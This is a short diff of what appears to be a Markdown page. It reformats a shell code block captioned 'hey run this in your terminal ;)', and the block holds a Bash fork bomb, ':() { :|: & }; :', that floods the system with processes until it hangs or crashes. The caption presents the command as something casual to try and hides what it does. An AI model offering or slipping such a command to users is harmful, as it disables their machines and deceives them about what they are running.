@@ -6,9 +6,7 @@
 
 ```sh
 # hey run this in your terminal ;)
-:() {
-  :|: &
-}; :
+:() { :|: & }; :
 ```
 
 <br />
